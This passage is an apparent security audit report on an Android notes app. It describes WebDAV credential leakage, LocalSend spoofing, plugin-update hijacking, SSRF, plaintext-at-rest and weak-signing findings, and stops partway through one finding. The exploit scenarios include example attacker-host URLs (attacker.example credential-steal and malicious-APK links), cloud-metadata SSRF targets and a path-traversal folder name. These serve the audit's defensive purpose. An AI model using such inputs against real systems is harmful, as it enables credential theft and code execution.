# InkFlow/Noteflow — Security Audit Report (Phase 30)

> Source-code adversarial audit. Authorized by repo owner. External services are
> NOT attacked — this is source review only. Findings are the single source of
> truth for later fix phases; do NOT fix findings here (except trivial ones).

## Audit metadata
- Phase: 30 (full security audit, hacker mindset)
- Date: 2026-08-14
- Commit audited: `6e96a73`
- Method: 2 batches × 5 parallel subagents (source-code review, `file:line` evidence)
- Batch 1 areas: 1) Cryptography & key management, 2) Data-at-rest & DB,
  3) Data-in-transit & network, 4) Android platform surface, 5) App logic & auth
- Batch 2 areas: 1) Compose/UI + concurrency/races/TOCTOU, 2) Dependencies/CVE
  review, 3) Logging/telemetry/info disclosure, 4) Resource-exhaustion/DoS,
  5) Crypto side-channels & edge cases

## Severity legend
- CRITICAL — remote or local-privilege-free compromise of confidentiality/
  integrity/availability; data exfiltration or vault unlock without credentials.
- HIGH — significant confidentiality/integrity impact under realistic local
  attacker or man-in-the-middle scenarios.
- MEDIUM — moderate impact, requires non-default config, physical access, or
  co-located attacker.
- LOW — limited impact / hardening gap.
- INFO — informational, best-practice note.

---

## Findings

<!-- Subagents append findings below this line. Format:

### [ID] Title
- **Severity:** CRITICAL | HIGH | MEDIUM | LOW | INFO
- **Area:** <batch-area>
- **Agent:** <agent-name>
- **Evidence:** `file:line`
- **Exploit scenario:** ...
- **Fix:** ...

-->

### [B1-NET-01] WebDAV sync: server-controlled PROPFIND `href` steers downloads to an arbitrary host and the app forwards the user's Basic credentials there (incl. cleartext via the `allowInsecureHttp` opt-in)
- **Severity:** HIGH
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `WebDavSyncService.kt:263-274` (regex over server XML; `matches.last()` at 270 and the absolute-URL branch `if (latestRemotePath.startsWith("http"))` at 271-274 use a host that comes straight from the server's PROPFIND body), `WebDavSyncService.kt:276` (connects to whatever host that URL names), `WebDavSyncService.kt:151-153` (`createConnection` sets `Authorization: Basic base64(username:password)` on ANY host the URL resolves to), `WebDavSyncService.kt:119-127` (`requireSecureUrl` only gates the *scheme*; the destination host is never compared against the configured `config.serverUrl`)
- **Exploit scenario:** A compromised or malicious WebDAV/Nextcloud server (the endpoint the user already configured, or any server the user is testing) answers the PROPFIND listing with `<d:href>https://attacker.example/steal/noteflow_vault_backup_1.nfb</d:href>`. The regex at line 263 matches it, the absolute-URL branch at line 271 accepts it verbatim, and `downloadLatestEncryptedVault` then connects to `attacker.example`, sending `Authorization: Basic <user:pass>` (line 151-153) plus the encrypted backup request. The attacker harvests the user's WebDAV credentials and backup bytes. With `allowInsecureHttp=true` (the documented local-NAS opt-in, `WebDavSyncDialog.kt:44,117`) the `href` can be `http://169.254.169.254/...` or `http://<any-private-ip>/...` and the credentials travel in cleartext. This is exactly the "opt-in bypass via SSRF from server-supplied data" the design claims to prevent: the guard checks the scheme and the local-network property of the *target* host, but never that the target is the configured server.
- **Fix:** Only follow `href`s that resolve under the configured `config.serverUrl` origin (compare scheme+host+port against the normalized base); reject any absolute URL whose host differs, or re-resolve it against the base path. Set `instanceFollowRedirects=false` and strip the `Authorization` header on any cross-host redirect. Never attach Basic auth to a host other than the user's configured server.

### [B1-NET-02] LocalSend: unauthenticated one-way transfer lets a same-LAN attacker's fake receiver obtain PLAINTEXT note/vault content; the "human-accept" and TLS fingerprint are both receiver-announced
- **Severity:** HIGH
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `LocalSendSender.kt:75-84` (announce advertises `protocol = "http"` by default), `LocalSendProtocol.kt:178-185` (`alias`/`protocol`/`fingerprint` all come from the attacker-crafted announce JSON), `LocalSendSender.kt:322-353` (sends `/prepare-upload` and `/upload` to `device.baseUrl()` built from that JSON), `LocalSendSender.kt:458-481` (for `http` there is no TLS at all; the fingerprint is only used when the receiver itself announces `https`), `LocalSendSender.kt:492-520` (`LocalSendTrustManager` pins to the *self-announced* fingerprint — no trusted anchor, a fake receiver just announces its own cert), `LocalSendSendDialog.kt:87-95` (payloads include `NOTE_HTML` = plaintext note export and Obsidian/HTML vault zips which are plaintext)
- **Exploit scenario:** On any shared Wi-Fi an attacker broadcasts a forged LocalSend announce (`alias: "Galaxy S24"`, `protocol: "http"`). The user sees it in the device list, selects it, taps send. The attacker's fake receiver answers `POST /api/localsend/v2/prepare-upload` with `200 {sessionId, files}` immediately — the "human must accept" step is implemented receiver-side and is in no way cryptographically bound to the receiver the user thinks they chose (no pre-shared secret, no user-typed PIN, no TOFU anchor persisted across sends). The app then streams the plaintext note HTML (or the vault export zip) to the attacker. The pinning in `LocalSendTrustManager` provides zero authentication because the pinned fingerprint is the attacker's own announcement. (Mitigation to be aware of: `targetSdk=36` with no network-security config means the platform default cleartext block currently makes the `http://` path fail at runtime — but the code is *written* to send over cleartext LAN, and the fake-receiver problem exists for the `https` path too.)
- **Fix:** Implement confirmed pairing: the receiving device displays a human-readable code/PIN that the sender verifies out-of-band, and the sender persists the receiver's TLS fingerprint after a first explicit confirmation (TOFU) and refuses to send to an unknown/unpaired device. Never announce or connect with `protocol: "http"`; require TLS for any payload. Treat "receiver returned 200 to prepare-upload" as zero evidence of user consent.

### [B1-NET-03] Plugin update chain: the unpinned, unsigned, redirect-following manifest defines the ENTIRE trust anchor (downloadUrl + sha256 + pinnedCertHash) → manifest compromise = arbitrary code execution
- **Severity:** HIGH
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `HostedPluginManifest.kt:29-57` (a manifest offer carries `downloadUrl`, `sha256`, AND `pinnedCertHash`), `PluginUpdateChecker.kt:30-38` (`toTargetEntry` copies the manifest's `downloadUrl`/`sha256`/`pinnedCertHash` verbatim into the persisted entry), `PluginUpdateEngine.kt:128` (verifier runs against those manifest-supplied values), `HttpsManifestTransport` `PluginManifestFetcher.kt:83-151` (manifest fetched over system-chain HTTPS only — no cert pin, no signature — with `instanceFollowRedirects=true` at line 98), `HttpsPluginDownloadTransport.kt:56-62` (artifact transport also follows redirects)
- **Exploit scenario:** The verifier's claim ("pinned compile-time certificate + SHA-256 is the trust anchor", `PinnedCertHash.kt:20-21`) is false for the Phase-24 update path: every anchor is supplied by the manifest itself, and the manifest is fetched with nothing stronger than ordinary CA-validated TLS against `plugin-updates.inkflow.app`. An attacker who MITMs that host (DNS hijack + any CA-issued cert, a CDN/hosting-account compromise, or a server that can be made to 302 to `http://…` — which the redirect-following at `PluginManifestFetcher.kt:98` happily follows) serves a forged offer for an installed downloadable plugin: `downloadUrl: https://attacker.example/evil.apk`, `sha256: <hash of evil.apk>`, `pinnedCertHash: sha256/<attacker cert>`. Every subsequent check — manifest validation (`HostedPluginManifest.kt:41-56`), TLS pin on download (`HttpsPluginDownloadTransport.kt:143-154`), artifact signature (`ArtifactSignatureVerifier.kt:51-77`) — passes self-consistently, and `PluginUpdateEngine` smoke-tests + installs attacker DEX. The only remaining gate is the user's one-click approval dialog showing attacker-chosen notes. Full arbitrary code execution in the app process with access to the plugin capability facade.
- **Fix:** The manifest must NOT be able to set the trust anchor. Ship compile-time per-plugin pinned identities (e.g., a known `id → {signingCertHash, sha256}` map for every released version, or pin a manifest *signing key* in the APK and require the manifest to be signed and verified before trusting any entry). Additionally: set `instanceFollowRedirects=false` on both the manifest and artifact transports, and restrict `downloadUrl` hosts to an allow-list that includes the manifest host.

### [B1-NET-04] SSRF in Web Capture and Citation title-fetch: no host blocklist, redirects re-check only the scheme — localhost / LAN / cloud-metadata endpoints reachable
- **Severity:** MEDIUM
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `WebPageFetchPolicy.kt:31-58` (despite the comment "SSRF-ish host guards", `validateUrl` only checks scheme + host presence — `localhost`, `127.0.0.1`, `192.168.*`, `10.*`, `169.254.169.254` all pass), `WebPageFetcher.kt:21-61` (manual redirect loop — hop N re-checks only `http`/`https` scheme at lines 25-28, never the host), `HttpsTitleFetcher.kt:32-48` (same)
- **Exploit scenario:** A malicious note or pasted link contains `http://169.254.169.254/latest/meta-data/iam/security-credentials/...`, `http://localhost:<port>/admin`, or `http://192.168.1.1/status`. When the user runs Web Capture (HomeScreen dialog, `HomeScreen.kt:2472`) the app fetches the internal endpoint and stores the body into the vault (or the Citation plugin fetches it and displays the title). A public page that answers with `302 Location: http://169.254.169.254/...` bypasses whatever input validation existed, because the redirect path re-validates only the scheme. On VPN/enterprise networks this reaches real internal services from the device.
- **Fix:** Enforce a loopback/link-local/private/metadata blocklist (RFC1918, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `.local`) both at `validateUrl` and on every redirect hop (re-parse the resolved Location and re-apply the same validation before connecting); consider HTTPS-only for capture; keep the 5-hop cap.

### [B1-NET-05] HTTPS→HTTP redirect downgrades: default redirect-following defeats every "HTTPS only / never cleartext" guard in all HttpURLConnection-based transports
- **Severity:** MEDIUM
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `PluginManifestFetcher.kt:98` (`instanceFollowRedirects = true`), `HttpsPluginDownloadTransport.kt:62` (same), `WebDavSyncService.kt:138-155` (`createConnection` never disables redirects; `requireSecureUrl` is evaluated once at connect time for the *initial* URL only), `HttpsTitleFetcher.kt:37`, `DuckDuckGoClient.kt:139`, `WeatherClient.kt:80`, `DictionaryClient.kt:45`
- **Exploit scenario:** Every one of these claims "HTTPS only — cleartext refused", but none disables redirects. An `https://` server that answers `307 Location: http://...` (misconfiguration, or an attacker-influenced endpoint) makes the app continue the request over plaintext: the WebDAV PUT body (encrypted backup) and — on `allowInsecureHttp` configs — the Basic header traverse the LAN/ISP in cleartext; the plugin manifest arrives over cleartext, defeating the "HTTPS only" gate that B1-NET-03 then leverages. The scheme guard runs *before* the connection is created, not on the redirected connection.
- **Fix:** Set `instanceFollowRedirects=false` on all of these connections and implement redirect handling manually (re-run `requireSecureUrl`/host checks on every hop; reject any hop that is not `https` for the TLS-required transports).

### [B1-NET-06] LocalSend: opening the Send dialog actively probes every IP in the Wi-Fi /24 and broadcasts device-model + presence
- **Severity:** LOW
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `LocalSendSender.kt:195-218` (`legacyHttpScan` walks `1..254` of the active /24), `LocalSendSender.kt:230-258` (POST `/api/localsend/v2/register` carrying `senderInfo()`), `LocalSendSender.kt:73` (`senderFingerprint`), `LocalSendSender.kt:75-84` (`alias = "InkFlow (Build.MODEL)"`, `deviceModel = Build.MODEL`), `LocalSendSender.kt:136-156` (repeated UDP multicast/broadcast announces)
- **Exploit scenario:** Just opening the "Send to Nearby Device" dialog (`discover()` runs immediately, `LocalSendSendDialog.kt:73`) makes the device sweep the whole subnet with HTTP POSTs on port 53317 and emit broadcast/multicast announces every ~1.1 s. Any host on the LAN (including passive monitoring at the AP) can detect the app's presence, the exact device model, and its local IP; the probes can also be used to finger other network stacks. No user confirmation is required before this traffic.
- **Fix:** Require explicit user confirmation before any LAN traffic; gate the /24 sweep behind it (or drop the sweep and rely on UDP discovery); remove `Build.MODEL` from the announce (send only a user-set alias).

### [B1-NET-07] WebDAV download: no size cap, "latest" chosen by XML order not timestamp, `remoteFolderName` URL-unsafe (path traversal into other server dirs)
- **Severity:** LOW
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `WebDavSyncService.kt:263-274` (`matches.last()` = last href in XML document order, not newest), `WebDavSyncService.kt:276-284` (streams `downloadConn.inputStream` to `targetLocalFile` with no size limit), `WebDavSyncService.kt:170-177` + `202-203` (`remoteFolderName` interpolated into the URL path without percent-encoding)
- **Exploit scenario:** A malicious/compromised WebDAV server streams an unbounded response to fill the app's cache (`webdav_download_import.nfb`) — local disk-exhaustion DoS; a server returning hrefs in non-chronological order makes "Download & Restore" silently restore an *older* backup (data rollback); a folder name like `../../Other` (or `%2e%2e%2f`) causes uploads/downloads to hit unintended server paths.
- **Fix:** Cap the download at a fixed max and abort beyond it; parse the timestamp from the filename and pick the maximum; URL-encode `remoteFolderName` as a single path segment and reject `.`/`..`/control characters.

### [B1-NET-08] WebDAV credential store: keystore key not bound to any user-authentication gate; silent save failures leave stale credentials
- **Severity:** INFO
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `WebDavCredentialStore.kt:49-61` (`KeyGenParameterSpec` without `setUserAuthenticationRequired`), `WebDavCredentialStore.kt:74-94` (`save()` catches all exceptions and returns silently — a failed write leaves the previous credentials in place while the UI believes they were saved), `WebDavCredentialStore.kt:100-127`
- **Exploit scenario:** Any code running in the app process (including a downloaded plugin that obtains the facade, or a device thief who can run the app as the owning user on an unlocked device) can decrypt the stored WebDAV password/token without any biometric/pin challenge — the key is non-extractable but *usable* whenever the process runs. The encrypt-at-rest property holds; only the missing auth gate is noted. The silent-failure path means a failed `apply()`/encryption can leave the user's prior server/credentials recorded while the new ones are dropped.
- **Fix:** Optional `setUserAuthenticationRequired(true)` (+ `setInvalidatedByBiometricEnrollment(true)`) when the user opts into biometric unlock; at minimum surface save failures to the UI so stale credentials are not silently kept.

### [B1-NET-09] User-Agent / metadata fingerprinting: app+version+OS leaked to every server contacted
- **Severity:** INFO
- **Area:** Batch 1 · Data-in-transit & network
- **Agent:** b1-net
- **Evidence:** `WebDavSyncService.kt:154` (`User-Agent: Noteflow-Android-WebDAV-Sync/2026`), `PluginManifestFetcher.kt:100` + `HttpsPluginDownloadTransport.kt:162` (`Noteflow-Plugin-Runtime/2026`), `LocalSendSender.kt:76-79` (`Build.MODEL`), `WebPageFetcher.kt:85-86` (`InkFlow/1.0`)
- **Exploit scenario:** A monitoring server (e.g., a malicious WebDAV server per B1-NET-01) can fingerprint the exact app, version and device model, then serve version-specific malicious payloads or pick a matching exploit for an adjacent component. The LocalSend announce also discloses `Build.MODEL` to every LAN host.
- **Fix:** Use a generic, version-less User-Agent; remove `Build.MODEL` from LocalSend announces.

### [B1-DB-1] Over-broad "corruption" classifier quarantines HEALTHY vaults on any SQLiteException and silently replaces them with an empty DB
- **Severity:** HIGH
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `NoteflowDatabase.kt:287-296` — `isDatabaseCorruptException` returns true if `e is android.database.sqlite.SQLiteException` (class-wide), `className.contains("SQLiteException")`, or the message contains corrupt/malformed/"file is not a database". `android.database.sqlite.SQLiteDatabaseLockedException` and `SQLiteCantOpenDatabaseException` (e.g. "database is locked", "disk I/O error", ENOSPC at open) are SUBCLASSES of `SQLiteException`. When it fires: `NoteflowDatabase.kt:259-261`/`274-276` immediately `quarantineCorruptDatabase()` (renames db+wal+shm+journal to `*.corrupt-<ts>`) and then create a BRAND-NEW EMPTY database with the current DEK.
- **Exploit scenario:** A transient, perfectly recoverable open failure (device under memory/disk pressure, another process momentarily holding the lock, torn I/O on app kill) is classified as cryptocorruption. The healthy vault is renamed aside to `noteflow.sqlite.corrupt-<ts>`, a fresh EMPTY vault is created behind it, and the CorruptionRecoveryScreen appears claiming "your data was NOT erased". The user's only two choices are "restore from backup" or "Start fresh" — tapping Start fresh (`NoteflowViewModel.kt:949-959`) clears the corruption flag and *discards* the quarantined copy permanently. Since the `.corrupt-*` file was never genuinely corrupt, a routine hiccup becomes permanent data loss of a healthy vault, with the error misattributed to crypto failure. Repeatable on demand: an attacker who can trigger DB lock contention (or a full internal storage) causes the vault to be quarantined.
- **Fix:** Match only the specific corruption conditions (`android.database.sqlite.SQLiteDatabaseCorruptException`, `msg.contains("file is not a database"/"malformed"/"database disk image is malformed")`); never treat "database is locked"/I/O/ENOSPC class exceptions as corruption. Additionally, quarantine alone should not auto-create a replacement DB — surface recovery first and only create an empty vault after the user's explicit choice, so a spurious event never leaves a healthy vault displaced by an empty one.

### [B1-DB-2] Plaintext→SQLCipher migration deletes the original database file on ANY failure (contradicts the Phase-09 never-delete guarantee)
- **Severity:** MEDIUM
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `NoteflowDatabase.kt:191-232` `migratePlaintextIfNeeded` — on success it `dbFile.delete(); tempFile.renameTo(dbFile)` (220-221). The `catch` block (`NoteflowDatabase.kt:224-231`) deletes `dbFile` PLUS `-wal`/`-shm` on ANY exception, with no quarantine name and no `DatabaseSecurityHelper.setCorruptionDetected` call, so no recovery screen is shown afterwards.
- **Exploit scenario:** A pre-SQLCipher (legacy plaintext) install is upgraded. The first encrypted open triggers the in-place migration. If anything fails mid-way (disk full during `sqlcipher_export`, source file torn, permission error creating the temp file) the ORIGINAL plaintext database — the only copy of the user's notes — is deleted and a new empty DB is created (or the open throws with nothing recoverable). There is no `*.corrupt-*` rescue and no recovery screen, so the notes are gone irreversibly. This is exactly the Phase-09 H2 defect the code fixes in `SafeSupportSQLiteOpenHelper` (comment at `NoteflowDatabase.kt:253-258`) but the migration path still violates it.
- **Fix:** On migration failure, rename the original file to `noteflow.sqlite.migrate-failed-<ts>` (preserve bytes), set the corruption flag so the user reaches the recovery screen instead of silently losing the file, and remove the unconditional `dbFile.delete()`.

### [B1-DB-3] Voice notes are recorded as UNENCRYPTED .m4a files and excluded from field encryption, backups, and permanent-delete
- **Severity:** MEDIUM
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `VoiceNoteManager.kt:65-66` records straight to `File(context.filesDir, "voice_notes")` as an MPEG-4/AAC file via `MediaRecorder` with no encryption anywhere; the path is persisted in `media_embeds.contentUrlOrPath` which is NOT in the field-encryption map (`ImportExportService.kt:1107-1112` covers only pages/strokes/media textContent/note_versions) and NOT in `reencryptPlaintextFields` (`NoteRepository.kt:165-230`); `NoteRepository.deletePagePermanently` (`NoteRepository.kt:422-434`) only deletes `sourceFilePath` when the path contains "imports/" or "exports/" — `voice_notes/` audio survives page deletion; `exportBackup` (`ImportExportService.kt:1154-1214`) packs only the DB + `imports/` dir, never `voice_notes/`.
- **Exploit scenario:** The app advertises "encrypted at rest" (SQLCipher + field AES-GCM), but recordings under `filesDir/voice_notes/` are raw audio with zero encryption. On a device running a debuggable build any adb/USB session can `run-as` and `tar` the directory; on a rooted device a forensic image yields every private voice memo in cleartext without touching the SQLCipher vault or the key at all. Deleted pages leave orphaned audio behind, and no backup includes the audio, so it is simultaneously unprotected and un-recoverable.
- **Fix:** Encrypt recorded audio at rest (write to a temp, AES-GCM-encrypt with the DEK, store the `.enc` blob, or use an encrypted file provider), delete `voice_notes/` files on `deletePagePermanently`/`emptyTrash`, and include the encrypted audio in `exportBackup`.

### [B1-DB-4] Markdown/text note BODIES are stored as PLAINTEXT files in `filesDir/noteflow/imports` even when a master password is set
- **Severity:** HIGH
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** Imported `.md`/`.txt`/DOCX/HTML/Obsidian notes are persisted verbatim via `ImportExportService.persistFile` `ImportExportService.kt:55-75` into `filesDir/noteflow/imports`; every subsequent edit rewrites plaintext via `File(path).writeText(newText)` `MainActivity.kt:339` and `MainActivity.kt:436`; only the database copy of the body (`extractedText`) is AES-GCM field-encrypted (`NoteRepository.kt:356-362`). The note title is also used as the raw filename (e.g. `My_Secure_Note_1724567890.md`).
- **Exploit scenario:** The full body of every markdown/text note sits in cleartext in the app-private dir even with a strong master password. An attacker with `run-as` (debug/adb builds), root, or a forensic image reads every note's complete text without ever touching the SQLCipher DB, the password, or the DEK — the vault encryption is a complete no-op for this entire note class. This is the notes app's core confidentiality claim being silently bypassed by a companion-file design.
- **Fix:** Store note bodies ONLY in the field-encrypted `extractedText` column (attach the source file just as an import artifact, or encrypt the .md file with the DEK before persisting it); at minimum, encrypt `imports/` contents or move to encrypted blobs and re-encrypt on save.

### [B1-DB-5] HTML/Obsidian ZIP import reads entries with unbounded `readBytes()` — zip-bomb DoS with no byte/size caps
- **Severity:** MEDIUM
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `ImportExportService.importHtmlZipOrFolder` `ImportExportService.kt:1791-1792` (`zis.readBytes()` per entry) and `importObsidianVaultZip` `ImportExportService.kt:1969-1972`, `1983-1985` (unbounded `zis.readBytes()` for every image and every .md entry, unlimited entry count); by contrast the restore path has hard caps — `copyWithLimit` `ImportExportService.kt:1216-1253` (50MB/file, 200MB total, 100× ratio). These import paths are reachable both from the import picker (`HomeScreen.kt:203-213`) and from the exported `ACTION_SEND */*` handler (`MainActivity.kt:95,513-600`).
- **Exploit scenario:** A crafted zip (nested compression, many large entries) sent via the share sheet or picked from Downloads decompresses megabytes→gigabytes into heap via `readBytes()`, crashing the app with OOM/ANR and, on aggressive OS reclaim, potentially destabilizing other apps. The "zip bomb" is the classic vector; the code already defends the backup path but forgets the import paths that consume attacker-controlled archives.
- **Fix:** Reuse the `copyWithLimit`-style accounting (per-entry and total caps, expansion-ratio guard) for both import zip readers; also cap the total entry count and the originating `readUriBytes` (`ImportExportService.kt:77-83`) stream size.

### [B1-DB-6] Tamper HMAC covers only the main .sqlite file (not WAL frames) and can be silenced by defaulting the check off
- **Severity:** LOW
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `DatabaseSecurityHelper.computeDatabaseHmac` `DatabaseSecurityHelper.kt:49-65` streams only `noteflow.sqlite`; the DB runs `WRITE_AHEAD_LOGGING` `NoteflowDatabase.kt:358`, so committed-but-uncheckpointed data lives in `-wal` which the HMAC never covers; `verifyDatabaseIntegrity` `DatabaseSecurityHelper.kt:146-154` re-baselines (returns true) whenever the stored checksum is missing; and the tamper banner's "Don't show again" checkbox disables the whole check permanently (`NoteflowViewModel.kt:974-981` sets `settings.databaseIntegrityCheckEnabled = false`).
- **Exploit scenario:** (a) An attacker who can reset the checksum pref (root) — or any WAL-only mutation before the next checkpoint — edits/forges data undetected because the baseline is re-armed or the target file never covered the modified bytes. (b) More realistically, the WAL not being in the baseline means normal WAL replay changes the main file after a stamp, producing spurious "database integrity warning" alarms; a user who clicks "Don't show again" permanently disables the only tripwire, after which tampering is never flagged (the app itself walks the user into reducing the protection). (b1-crypto's B1-CRYPTO-06 already covers the fail-open re-baseline; this block adds the WAL-coverage gap and the one-tap-disable downgrade.)
- **Fix:** Include the `-wal` bytes (or checkpoint + re-stamp atomically before every baseline creation — the export paths already do this at `NoteflowViewModel.kt:2017-2019`, replicate it wherever a baseline is armed); never let a single checkbox permanently kill the integrity check — at most store a per-session dismissal.

### [B1-DB-7] Restore accepts a legacy PLAIN zip and validates it with an EMPTY-key SQLCipher candidate — an attacker-crafted database can be swapped into the live vault
- **Severity:** MEDIUM
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `ImportExportService.importBackup` legacy path `ImportExportService.kt:1392-1403` treats any `PK`-headed payload as a plain (unencrypted, keyless) backup; `validateAndPrepareRestoredDb` tries `listOfNotNull(backupDekHex, currentDekHex, "")` `ImportExportService.kt:1476-1502`, so an attacker's SQLCipher database created with the empty passphrase (trivially: `sqlcipher evil.sqlite`, integrity_check = "ok") passes validation, gets `user_version` ≤ current, is re-keyed to the victim's real DEK and field-re-encrypted, HMAC-rearmed (`ImportExportService.kt:1425-1428`), and moved over the live vault; the only gate is the legacy-restore confirm dialog `HomeScreen.kt:150-155`.
- **Exploit scenario:** An attacker (phishing mail, share sheet, "restore from backup" instructions) gets the user to import a crafted zip. The attacker-supplied `noteflow.sqlite` — fully under attacker control and accepted because the format itself allows an unsigned, unencrypted backup — replaces the victim's entire vault with attacker-chosen content: spoofed security notices ("vault compromised, enter your master password in the settings"), planted notes/data, or an empty DB wiping everything, all presented by the app as a "successful restore". The empty-key candidate also means ANY plaintext SQLite file that happens to pass `PRAGMA integrity_check` with the empty key becomes the vault.
- **Fix:** Reject legacy unencrypted (plain-zip) backups outright (require password-v2 or at least device-keyed formats) or at minimum drop the `""` empty-key candidate so only the backup's own wrapped DEK or the current DEK can open it; keep a prominent "untrusted/unsigned backup" warning for any legacy import.

### [B1-DB-8] Decrypt-failure fallbacks return RAW CIPHERTEXT as note content instead of failing safe
- **Severity:** LOW
- **Area:** Batch 1 · Data-at-rest & DB
- **Agent:** b1-datarest
- **Evidence:** `NoteRepository.getStrokesForPage` `NoteRepository.kt:449-457` catches any decrypt exception and returns `rawText` (the ciphertext blob) as the stroke's text; `decryptPageIfNeeded` `NoteRepository.kt:810-828` returns the page unchanged (encrypted title/extractedText) on any decrypt failure; same pattern for embeds `NoteRepository.kt:609-613` and versions `NoteRepository.kt:800-807`.
- **Exploit scenario:** After a re-key, cross-device restore with a mismatched DEK, or partial DB manipulation, the app silently displays base64 AES-GCM garbage as if it were the real note title/text. A user reading a "tampered" note can be misled by the displayed material, and — because the failure looks like legitimate content — the incident is logged as a normal note rather than surfaced as a decryption failure, masking the underlying tamper/re-key problem the integrity checks are meant to catch.
- **Fix:** On decrypt failure, return an explicit error marker (e.g. "Unreadable (decryption failed)") and surface a recovery/re-key promotion rather than raw ciphertext; treat persistent decryption failure as a corruption/restore event.

### [B1-PLAT-1] Release APK is signed with the Android debug keystore (well-known password) whenever KEYSTORE_FILE is unset — the default build path
- **Severity:** MEDIUM
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `app/build.gradle.kts:28-54` (releaseConfig falls back to `${rootDir}/debug.keystore` decoded from `debug.keystore.base64`, password `android`, alias `androiddebugkey`), `app/build.gradle.kts:63-77` (release buildType: `signingConfig = signingConfigs.getByName("debug")` when no release keystore exists)
- **Exploit scenario:** CI and any local `gradle assembleRelease` build without `KEYSTORE_FILE` produces a release APK signed with the public, well-known Android debug key whose password is literally `android`. Any party who obtains that debug keystore (CI artifacts, a dev machine, a leaked `debug.keystore.base64` — which the build itself decodes at `build.gradle.kts:40-45`) can sign a malicious APK that the platform accepts as a legitimate UPDATE over the installed app (same signature = no "signature mismatch" warning on sideload/update). Android also refuses debug-signed releases for distribution, so the "release" provenance of the shipped app is not verifiable. The app's entire update trust chain (see B1-PLAT-7) is as strong as the secrecy of a keystore whose password is a dictionary word.
- **Fix:** Fail the release build when `KEYSTORE_FILE` is unset instead of silently falling back to a debug key; never decode a keystore from an in-repo base64 blob; store the production key in a real secret store; affirm in `docs/RELEASE.md` that debug-fallback builds must not be distributed.

### [B1-PLAT-2] Exported `singleTask` MainActivity accepts ACTION_SEND from ANY app, bypassing the system share chooser, and ingests attacker content into the vault
- **Severity:** MEDIUM
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `AndroidManifest.xml:33-68` (MainActivity `exported="true"`, `launchMode="singleTask"`, `SEND`/`SEND_MULTIPLE` filters for `text/plain`, `image/*`, `*/*`); `MainActivity.kt:95`, `502-578` (`readShareIntent` from `onCreate`/`onNewIntent`); `MainActivity.kt:582-600` (`copySharedUris` copies arbitrary granted streams into `filesDir/shared`); `MainActivity.kt:173-181` (pending share is auto-applied to a new note after unlock)
- **Exploit scenario:** Because the SEND filters match a bare `startActivity(intent)` (no chooser involvement), a malicious installed app can fire an ACTION_SEND intent directly at this exported component. The app is yanked to the foreground with no user confirmation and immediately (a) performs `contentResolver.openInputStream(...)` on attacker-supplied `EXTRA_STREAM` URIs and copies their full byte content into app-private storage, and (b) if the vault is unlocked — or on the user's next legitimate unlock — silently creates a note whose title/body/embedded image paths are 100% attacker-controlled. Impact: attacker-injected phishing/content notes ("vault compromised", "reset your password"), forced copy of attacker-served data into the vault area, and a repeatable storage-exhaustion DoS by sending huge `EXTRA_STREAM` payloads.
- **Fix:** Require an explicit in-app confirmation for all incoming shares (e.g., verify the intent was delivered via the chooser `ClipData`/`EXTRA_ORIGIN` flow, or show a "Clip into InkFlow?" confirm dialog before staging/copying); cap `copySharedUris` total bytes; do not pre-copy share streams while the vault is locked.

### [B1-PLAT-3] Whole-vault exports (Obsidian .zip / HTML site .zip) write DECRYPTED note plaintext to the public `/storage/emulated/0/Download` directory
- **Severity:** MEDIUM
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `HomeScreen.kt:479-489` (`onExportObsidianVault` → exported plaintext .md vault zip), `HomeScreen.kt:490-500` (`onExportHtmlVault` → plaintext HTML zip), both written to `Environment.getExternalStoragePublicDirectory(DIRECTORY_DOWNLOADS)`; `PsdExportService.kt:95-102` (rendered ink layers also copied to public Downloads); `HomeScreen.kt:451-475`, `1191-1202` (backup archives also land in public Downloads)
- **Exploit scenario:** One tap on "Export Obsidian Vault" or "Export HTML Site" writes the ENTIRE vault — every note in decrypted plaintext — into the world-readable shared Downloads directory with no password, no confirmation dialog, and no "unencrypted" warning. Any app with storage permission (the most commonly granted permission), a USB-connected computer (MTP exposes Downloads), or any person who picks up an unlocked device reads every note in plaintext. This directly negates the app's AES-256-GCM/SQLCipher at-rest posture for the exported copies, and the files persist after the vault is cleared.
- **Fix:** Present a bold pre-export warning that exports are unencrypted and land in public storage (suggest transferring then deleting); better, write exports via Storage Access Framework (`ACTION_CREATE_DOCUMENT`) so the user consciously picks the destination and stays in `filesDir`/`cacheDir` otherwise.

### [B1-PLAT-4] Auto-lock is OFF by default and lock() fires only on full backgrounding (ON_STOP), never on screen-off/keyguard — decrypted notes stay on-screen indefinitely
- **Severity:** MEDIUM
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `SettingsManager.kt:178-179` (`autoLockTimeoutSeconds` defaults to `0` = disabled); `MainActivity.kt:97-109` (ON_PAUSE only scrubs the clipboard; `viewModel.lock()` only on ON_STOP); `MainActivity.kt:189-199` (inactivity lock only triggers on the NEXT user touch once the timeout elapsed); `NoteflowViewModel.kt:2055-2067` (`lock()` zeroizes the key + clears pages, so it does exist but is only reachable via the above events)
